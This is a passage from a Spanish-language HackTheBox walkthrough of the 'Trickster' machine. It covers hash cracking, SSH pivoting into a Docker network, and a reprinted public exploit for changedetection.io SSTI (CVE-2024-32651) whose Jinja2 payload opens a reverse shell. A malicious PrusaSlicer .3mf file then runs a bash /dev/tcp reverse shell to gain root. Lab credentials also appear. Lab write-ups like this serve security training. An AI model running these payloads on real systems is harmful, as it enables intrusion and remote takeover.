            'cookie_iv' =&gt; 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
<br><br>Bueno como dirian mis colegas del sector "we're in"<br>
<img alt="Pasted image 20250213163524.png" src="machines/trickster/imgs/pasted-image-20250213163524.png"><br>MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
<br>De la base de datos saco las siguientes credenciales;<br>admin@trickster.htb : $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
james@trickster.htb : $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
<br>Identificamos los hashes:<br>➜  Trickster hashcat credentials 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Custom APU 0405, 6360/12785 MB (2048 MB allocatable), 8MCU

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce


<br>Creds :<br>
Crackeamos las passwords con hashcat o john <br>john credentials --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 3200  credentials /usr/share/wordlists/rockyou.txt 
<br>james : alwaysandforever
<br><br>Nos logeamos por ssh<br>➜  Trickster ssh james@trickster.htb
The authenticity of host 'trickster.htb (10.10.11.34)' can't be established.
ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'trickster.htb' (ED25519) to the list of known hosts.
james@trickster.htb's password: 
Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
james@trickster:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@trickster:~$ whoami
james
james@trickster:~$ 
<br>Sudo -l :<br>james@trickster:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on trickster.
<br>Revisando la configuracion de la red vemos que tenemos acceso a una red de docker pero no podemos ejecutar comandos de docker ya que james no forma parte del grupo docker:<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:e4:77 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.34/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:18:3b:cb:65 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
37: vethf843401@if36: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 0e:e5:f9:ea:9f:36 brd ff:ff:ff:ff:ff:ff link-netnsid 0
<br>viendo que tenemos una interfaz de ip's de docker vamos a escanear la red en búsqueda de posibles puntos de ataque;<br>Ya que nmap no esta  instalado en la maquina vamos a escanear la maquina con tecnicas lotl (living off the land)<br><a data-tooltip-position="top" aria-label="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" rel="noopener nofollow" class="external-link" href="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" target="_blank">Living  off the land tecniches : nmap</a><br><br>james@trickster:~$ for i in {1..254}; do ping -w 2 -c 1 172.17.0.$i | grep "64 bytes" | cut -d ' ' -f 4 | sed 's/://'; done;

172.17.0.1
172.17.0.2
<br>Vemos que tiene conexion con 2 ips dentro del rango;<br>
la 172.17.0.1 es la del propio host; mientras que la 172.17.0.2 parece de un container; vamos a investigar puertos abiertos<br><br>Escaneamos con nc el rango entero de puertos de la ip 172.17.0.2<br>james@trickster:~$ nc -vnz -w 1 172.17.0.2 1-65535 2&gt;&amp;1 | grep succeeded
Connection to 172.17.0.2 5000 port [tcp/*] succeeded!
<br>Tenemos conexion con el puerto 5000 vamos a hacer pivoting con ssh<br><br>Tenemos algun servicio corriendo en un docker en la ip 172.17.0.2 por el puerto 5000 vamos a hacer un puente con ssh para tener conexion con el puerto aunque podriamos hacer pivoting con chisel ,metaexploit o lingolo-ng;<br>➜  ~ ssh james@trickster.htb -L 5000:172.17.0.2:5000
<br>Podemos escanear el puerto con nmap a ver si encontramos informacion del servicio; ahora que esta establecido el puente la conexion<br>sudo nmap -sCV -p 5000 -v -Pn -n localhost
PORT     STATE SERVICE VERSION                                       
5000/tcp open  http    Python http.server 3.5 - 3.10
| http-title: Change Detection
|_Requested resource was /login?next=/
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
<br>Nos encontramos ante un changedetection.io en la v0.45.20<br>
<img alt="Pasted image 20250214113934.png" src="machines/trickster/imgs/pasted-image-20250214113934.png"><br><br>Investigando sobre la version de changedetection.io ; vemos que la version es vulnerable a la un SSTI en la version actual <br>Un SSTI (Server-Side Template Injection) es una vulnerabilidad de seguridad que permite a un atacante inyectar y ejecutar código en la plantilla de una aplicación del lado del servidor, aprovechando malas prácticas en el procesamiento de datos dinámicos. Esto puede llevar a la ejecución remota de código, acceso no autorizado o robo de datos sensibles. Ocurre cuando la aplicación inserta entradas de usuario sin sanitizar en templates que son procesados por el servidor.<br>Para mas informacion sobre ataques SSTI podemos visitar la pagina de <a data-tooltip-position="top" aria-label="https://portswigger.net/web-security/server-side-template-injection" rel="noopener nofollow" class="external-link" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">Portswigger</a><br>Esta vulnerabilidad de changedetection.io esta documentada en el <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" target="_blank">CVE-2024-32651</a><br><br>Buscamos en github y hay un PoC que automatiza el proceso del SSTI ; pongo el codigo y lo analizamos;<br>Al siguiente script debemos pasarle las siguientes variables<br>
<br>--url: URL base del sitio vulnerable (Nuestro caso: http://localhost:5000).
<br>--port: Puerto en el que el atacante escuchará la conexión inversa 
<br>--ip: Dirección IP del atacante para recibir la conexión inversa. (Nuestra interfaz tun0)
<br>--notification: URL de notificación personalizada (opcional).
<br># Exploit Title: changedetection &lt;= 0.45.20 Remote Code Execution (RCE)
# Date: 5-26-2024
# Exploit Author: Zach Crosman (zcrosman)
# Vendor Homepage: changedetection.io
# Software Link: https://github.com/dgtlmoon/changedetection.io
# Version: &lt;= 0.45.20
# Tested on: Linux
# CVE : CVE-2024-32651

from pwn import *
import requests
from bs4 import BeautifulSoup
import argparse

def start_listener(port):
    listener = listen(port)
    print(f"Listening on port {port}...")
    conn = listener.wait_for_connection()
    print("Connection received!")
    context.newline = b'\r\n'
    # Switch to interactive mode
    conn.interactive()

def add_detection(url, listen_ip, listen_port, notification_url=''):
    session = requests.Session()
    
    # First request to get CSRF token
    request1_headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }

    response = session.get(url, headers=request1_headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
    print(f'Obtained CSRF token: {csrf_token}')

    # Second request to submit the form and get the redirect URL
    add_url = f"{url}/form/add/quickwatch"
    add_url_headers = {  # Define add_url_headers here
        "Origin": url,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    add_url_data = {
        "csrf_token": csrf_token,
        "url": "https://reddit.com/r/baseball",
        "tags": '',
        "edit_and_watch_submit_button": "Edit &gt; Watch",
        "processor": "text_json_diff"
    }

    post_response = session.post(add_url, headers=add_url_headers, data=add_url_data, allow_redirects=False)

    # Extract the URL from the Location header
    if 'Location' in post_response.headers:
        redirect_url = post_response.headers['Location']
        print(f'Redirect URL: {redirect_url}')
    else:
        print('No redirect URL found')
        return

    # Third request to add the changedetection url with ssti in notification config
    save_detection_url = f"{url}{redirect_url}"
    save_detection_headers = {  # Define save_detection_headers here
        "Referer": redirect_url,
        "Cookie": f"session={session.cookies.get('session')}"
    }

    save_detection_data = {
        "csrf_token": csrf_token,
        "url": "https://reddit.com/r/all",
        "title": '',
        "tags": '',
        "time_between_check-weeks": '',
        "time_between_check-days": '',
        "time_between_check-hours": '',
        "time_between_check-minutes": '',
        "time_between_check-seconds": '30',
        "filter_failure_notification_send": 'y',
        "fetch_backend": 'system',
        "webdriver_delay": '',
        "webdriver_js_execute_code": '',
        "method": 'GET',
        "headers": '',
        "body": '',
        "notification_urls": notification_url,
        "notification_title": '',
        "notification_body": f"""
        {{% for x in ().__class__.__base__.__subclasses__() %}}
        {{% if "warning" in x.__name__ %}}
        {{{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"{listen_ip}\\",{listen_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
        {{% endif %}}
        {{% endfor %}}
        """,
        "notification_format": 'System default',
        "include_filters": '',
        "subtractive_selectors": '',
        "filter_text_added": 'y',
        "filter_text_replaced": 'y',
        "filter_text_removed": 'y',
        "trigger_text": '',
        "ignore_text": '',
        "text_should_not_be_present": '',
        "extract_text": '',
        "save_button": 'Save'
    }
    final_response = session.post(save_detection_url, headers=save_detection_headers, data=save_detection_data)

    print('Final request made.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Add detection and start listener')
    parser.add_argument('--url', type=str, required=True, help='Base URL of the target site')
    parser.add_argument('--port', type=int, help='Port for the listener', default=4444)
    parser.add_argument('--ip', type=str, required=True, help='IP address for the listener')
    parser.add_argument('--notification', type=str, help='Notification url if you don\'t want to use the system default')
    args = parser.parse_args()


    add_detection(args.url, args.ip, args.port, args.notification)
    start_listener(args.port)
<br>
<br>Configuración del Listener:

<br>Inicia un listener en un puerto especificado para recibir una conexión inversa desde el servidor vulnerable.


<br>Obtención del Token CSRF:

<br>Realiza una solicitud GET al sitio objetivo para obtener un token CSRF necesario para realizar solicitudes autenticadas.


<br>Creación de una Nueva Detección:

<br>Envía una solicitud POST para agregar una nueva URL a monitorear en la aplicación.
<br>Utiliza este proceso para obtener una URL de redirección que permite editar la configuración de la detección.


<br>Inyección de Código Malicioso:

<br>En la configuración de notificaciones de la nueva detección, inserta un payload SSTI que:

<br>Itera sobre las clases base del sistema Python.
<br>Busca una clase con "warning" en su nombre.
<br>Utiliza esta clase para importar y ejecutar comandos del sistema operativo.
<br>Ejecuta un comando que establece una conexión inversa al IP y puerto del atacante usando python3 y bash.




<br>Envío del Payload:

<br>Guarda la configuración maliciosa enviando otra solicitud POST.
<br>Esto activa el payload SSTI en el servidor vulnerable.


<br>Recepción de la Conexión Inversa:

<br>El servidor vulnerable ejecuta el código inyectado, conectándose al listener del atacante.
<br>El atacante obtiene acceso interactivo a la shell del servidor.


<br>El script no funciona, pruebo a reproducirlo paso a paso anadiendo debugs<br>Y es que el endpoint /login?next=/ Nos devuelve un 500 INTERNAL SERVER ERROR<br>
<img alt="Pasted image 20250214124302.png" src="machines/trickster/imgs/pasted-image-20250214124302.png"><br>Pruebo a logearme con las credenciales de james alwaysandforever<br>
Y entramos;<br>
<img alt="Pasted image 20250214125118.png" src="machines/trickster/imgs/pasted-image-20250214125118.png"><br>Si pulsamos en backup nos decarga un comprimido; vamos a echarle un vistazo;<br>➜  backdump ls
b86f1003-3ecb-4125-b090-27e15ca605b9  changedetection-backup-20250214115130.zip  url-list-with-tags.txt  url-watches.json
bbdd78f6-db98-45eb-9e7b-681a0c60ea34  secret.txt                                 url-list.txt
➜  backdump tree b86f1003-3ecb-4125-b090-27e15ca605b9 
b86f1003-3ecb-4125-b090-27e15ca605b9
|-- 3855b43e05c02a09c0b63be14f70a8bb.txt.br
|-- 7fa5d9292139604c79d87fb69f21ffe2.txt.br
|-- ce6278706b3912f01bf5355004eb538a.txt.br
|-- cf0c62552e4672c2326c0ef0489883c8.txt.br
|-- d589415eb5dbd392fa8874829ce30450.txt.br
|-- dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
`-- history.txt

1 directory, 7 files
➜  backdump cat b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1725049268,dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
   2   │ 1725093859,7fa5d9292139604c79d87fb69f21ffe2.txt.br
   3   │ 1725955071,d589415eb5dbd392fa8874829ce30450.txt.br
   4   │ 1726233055,cf0c62552e4672c2326c0ef0489883c8.txt.br
   5   │ 1726596196,ce6278706b3912f01bf5355004eb538a.txt.br
   6   │ 1726746285,3855b43e05c02a09c0b63be14f70a8bb.txt.br
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
➜  backdump cat url-list.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: url-list.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ https://news.ycombinator.com/
   2   │ https://changedetection.io/CHANGELOG.txt
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
➜  backdump cat secret.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: secret.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 5fce75c64d33acf05d2d3b21d29e693d992f240d5c440310cff3edfb743c64a5

<br><br>En el exploit de Python anterior, vimos la existencia de una flag llamada “–notification”, identificamos en el pie del campo “Notification Body” que usa Jinja2, esto nos permite ejecutar ataques de tipo SSTI (Server-Side Template Injection), reutilizamos el payload del exploit, nos ponemos en escucha por el puerto 80 y pulsamos en “Send test notification”:<br>Recibimos conexion con el servidor mandando una peticion por notification<br>
<img alt="Pasted image 20250214130533.png" src="machines/trickster/imgs/pasted-image-20250214130533.png"><br>
Ahora tenemos que inyectar la rev shell del script en el campo notifications; y somos root en el container<br><img alt="Pasted image 20250214130827.png" src="machines/trickster/imgs/pasted-image-20250214130827.png"><br>Encuentro el directorio /datastore/Backups dentro del container; no tenemos ni nc ni wget pero si python entonces puedo lanzat un servidor http y hacer otro puente ssh hacia el puerto<br>root@a4b9a36ae7ff:/datastore/Backups# python -m http.server 2000
Serving HTTP on 0.0.0.0 port 2000 (http://0.0.0.0:20
<br><img alt="Pasted image 20250214131310.png" src="machines/trickster/imgs/pasted-image-20250214131310.png"><br>Dentro de los backups encontramos estos archivos .br;<br><img alt="Pasted image 20250214174849.png" src="machines/trickster/imgs/pasted-image-20250214174849.png"><br>Lo descomprimimos con la herramienta <a data-tooltip-position="top" aria-label="https://github.com/google/brotli" rel="noopener nofollow" class="external-link" href="https://github.com/google/brotli" target="_blank">brotli</a> ; <br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 l
total 16K
drwxrwxr-x 2 kali kali 4,0K ago 31 10:50 .
drwxrwxr-x 3 kali kali 4,0K feb 14 13:14 ..
-rw-r--r-- 1 kali kali 2,6K ago 31 01:47 f04f0732f120c0cc84a993ad99decb2c.txt.br
-rw-r--r-- 1 kali kali   51 ago 31 01:47 history.txt
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ls
f04f0732f120c0cc84a993ad99decb2c.txt  f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt

<br>en el archivo de texto encontramos la password del usuario Adam<br>
<img alt="Pasted image 20250214175709.png" src="machines/trickster/imgs/pasted-image-20250214175709.png"><br><br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 cat --plain f04f0732f120c0cc84a993ad99decb2c.txt | grep password
                'database_password' =&gt; 'adam_admin992' ,                                                                                                               
                'mailer_password' =&gt; NULL ,                                                                                                                            
➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ssh adam@trickster.htb
adam@trickster.htb's password: 
adam@trickster:~$ id
uid=1002(adam) gid=1002(adam) groups=1002(adam)
adam@trickster:~$ whoami
adam
adam@trickster:~$ 
<br>Adam puede usar sudo en :<br>adam@trickster:~$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
<br>El binario no aparece en GTFObins; una busqueda en google me indica que igual es un binario relacionado con la gestion de impresoras 3D;<br>
<img alt="Pasted image 20250214181500.png" src="machines/trickster/imgs/pasted-image-20250214181500.png"><br>Le realizamos un string <br>adam@trickster:~$ strings /opt/PrusaSlicer/prusaslicer | grep print
sprintf
fprintf
appimage_print_binary
appimage_print_hex
print_help
  --appimage-mount                Mount embedded filesystem image and print

<br>adam@trickster:~$ /opt/PrusaSlicer/prusaslicer
DISPLAY not set, GUI mode not available.

PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r (with GUI support)
https://github.com/prusa3d/PrusaSlicer

Usage: prusa-slicer [ ACTIONS ] [ TRANSFORM ] [ OPTIONS ] [ file.stl ... ]

Actions:
 --export-3mf        Export the model(s) as 3MF.
 --export-amf        Export the model(s) as AMF.
 --export-gcode, --gcode, -g
                     Slice the model and export toolpaths as G-code.
 --export-obj        Export the model(s) as OBJ.
 --export-sla, --sla Slice the model and export SLA printing layers as PNG.
 --export-stl        Export the model(s) as STL.
 --gcodeviewer       Visualize an already sliced and saved G-code
 --help, -h          Show this help.
 --help-fff          Show the full list of print/G-code configuration options.
 --help-sla          Show the full list of SLA print configuration options.
 --info              Write information about the model to the console.
 --opengl-debug      Activate OpenGL debug output on graphic cards which support it
 --opengl-version ABCD
                     Select a specific version of OpenGL
 --save ABCD         Save configuration to the specified file.
 --slice, -s         Slice the model as FFF or SLA based on the printer_technology configuration
                     value.

Transform options:
 --align-xy X,Y      Align the model to the given point.
 --center X,Y        Center the print around the given center.
 --cut N             Cut model at the given Z.
 --delete-after-load ABCD
                     Delete files after loading.
 --dont-arrange      Do not rearrange the given models before merging and keep their original XY
                     coordinates.
 --duplicate N       Multiply copies by this factor.
 --duplicate-grid X,Y
                     Multiply copies by creating a grid.
 --ensure-on-bed     Lift the object above the bed when it is partially below. Enabled by default,
                     use --no-ensure-on-bed to disable.
 --merge, -m         Arrange the supplied models in a plate and merge them in a single model in order
                     to perform actions once.
 --repair            Try to repair any non-manifold meshes (this option is implicitly added whenever
                     we need to slice the model to perform the requested action).
 --rotate N          Rotation angle around the Z axis in degrees.
 --rotate-x N        Rotation angle around the X axis in degrees.
 --rotate-y N        Rotation angle around the Y axis in degrees.
 --scale N           Scaling factor or percentage.
 --scale-to-fit X,Y,Z
                     Scale to fit the given volume.
 --split             Detect unconnected parts in the given model(s) and split them into separate
                     objects.

Other options:
 --config-compatibility
                     This version of PrusaSlicer may not understand configurations produced by the
                     newest PrusaSlicer versions. For example, newer PrusaSlicer may extend the list
                     of supported firmware flavors. One may decide to bail out or to substitute an
                     unknown value with a default silently or verbosely. (disable, enable,
                     enable_silent; default: enable)
 --datadir ABCD      Load and store settings at the given directory. This is useful for maintaining
                     different profiles or including configurations from a network storage.
 --ignore-nonexistent-config
                     Do not fail if a file supplied to --load does not exist.
 --load ABCD         Load configuration from the specified file. It can be used more than once to
                     load options from multiple files.
 --loglevel N        Sets logging sensitivity. 0:fatal, 1:error, 2:warning, 3:info, 4:debug, 5:trace
                     For example. loglevel=2 logs fatal, error and warning level messages.
 --output ABCD, -o ABCD
                     The file where the output will be written (if not specified, it will be based on
                     the input file).
 --single-instance   If enabled, the command line arguments are sent to an existing instance of GUI
                     PrusaSlicer, or an existing PrusaSlicer window is activated. Overrides the
                     "single_instance" configuration value from application preferences.

Print options are processed in the following order:
  1) Config keys from the command line, for example --fill-pattern=stars
     (highest priority, overwrites everything below)
  2) Config files loaded with --load
  3) Config values loaded from amf or 3mf files

Run --help-fff / --help-sla to see the full listing of print options.

<br>La version del programa es vulnerable ; (PrusaSlicer-2.6.1)<br>
Vemos que se puede ejecutar código arbitrario observando la versión del programa en <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a><br><br>Segun <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a>:<br>For the linux PoC, this CLI command is enough to execute the payload contained in the project. './prusa-slicer -s code-exec-linux.3mf'. After slicing, a new file '/tmp/hax' will be created. This particular PoC contains this 'post_process' entry in the 'Slic3r_PE.config' file:  
<br>El exploit  permite la ejecución de código arbitrario al manipular el archivo Slic3r_PE.config dentro de un proyecto .3mf de PrusaSlicer.<br>El archivo Slic3r_PE.config es donde se define la configuración del proyecto y contiene la entrada post_process, que se utiliza para ejecutar scripts después de generar el archivo G-code. En este caso, modificaremos esta entrada para incluir nuestro payload .<br>Slic3r_PE.config:<br>; post_process = "/usr/bin/id &gt; /tmp/hax #\necho 'arbitrary code execution! (x_x)'&gt;&gt; /tmp/hax #"
<br><br>En el siguiente repositorio de github ya tenemos un archivo .3mf malicioso<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/suce0155/prusaslicer_exploit.git" target="_blank">https://github.com/suce0155/prusaslicer_exploit.git</a><br>Lo descomprimimos y observamos el arbol de directorio de los archivos .3mf y como este ejecuta el codigo arbitrario;<br>Para extraerlo usamos unzip o 7z cualquiera vale;<br>total 64K
drwxrwxr-x 4 kali kali 4,0K feb 14 20:00 .
drwxrwxr-x 6 kali kali 4,0K feb 14 19:52 ..
-rw-rw-r-- 1 kali kali  39K feb 14 19:52 evil.3mf
-rw-rw-r-- 1 kali kali   42 feb 14 19:52 exploit.sh
drwxrwxr-x 5 kali kali 4,0K feb 14 20:00 Extracted
drwxrwxr-x 8 kali kali 4,0K feb 14 19:52 .git
-rw-rw-r-- 1 kali kali  369 feb 14 19:52 README.md
➜  prusaslicer_exploit git:(main) ✗ tree Extracted 
Extracted
├── 3D
│   └── 3dmodel.model
├── [Content_Types].xml
├── Metadata
│   ├── Slic3r_PE.config
│   ├── Slic3r_PE_model.config
│   └── thumbnail.png
└── _rels

4 directories, 5 files

<br>El exploit esta en el archivo Slic3r_PE.config que es el que ejecuta codigo arbitrario<br> cat Extracted/Metadata/Slic3r_PE.config | grep tmp
; post_process = "chmod +x /tmp/exploit.sh";"bash /tmp/exploit.sh"
<br>El exploit le da permiso a un archivo /tmp/exploit.sh y lo ejecuta con bash<br>Modificamos exploit.sh y lo movemos a /tmp<br>adam@trickster:~/prusaslicer_exploit$ cat /tmp/exploit.sh 
/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.232/2323 0&gt;&amp;1
<br><br><img alt="Pasted image 20250215133235.png" src="machines/trickster/imgs/pasted-image-20250215133235.png">]]></description><link>machines/trickster/2.privesc.html</link><guid isPermaLink="false">Machines/Trickster/2.PrivEsc.md</guid><pubDate>Sat, 15 Feb 2025 12:37:35 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250213163524.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/trickster/imgs/pasted-image-20250213163524.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>